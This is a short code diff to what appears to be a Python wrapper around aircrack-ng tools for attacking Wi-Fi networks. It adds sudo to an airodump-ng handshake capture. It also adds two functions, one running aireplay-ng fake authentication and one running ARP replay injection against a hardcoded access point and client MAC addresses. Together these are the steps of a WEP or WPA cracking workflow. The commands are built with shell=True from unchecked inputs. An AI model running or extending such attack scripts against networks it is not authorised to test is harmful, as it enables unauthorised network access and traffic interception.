@@ -40,10 +40,13 @@ def testing(essid, target_ap, interface ):
 
 
 def handshake(channel, BSSID, interface):
-    subprocess.run(f" airodump-ng -c {channel} --bssid {BSSID} -w output {interface}", shell=True)
+    subprocess.run(f"sudo airodump-ng -c {channel} --bssid {BSSID} -w output {interface}", shell=True)
 
+def fake_authetication():
+    subprocess.run(f"sudo aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0", shell=True)
 
-
+def replay_mode():
+    subprocess.run(f" aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0", shell=True)
 
 
 
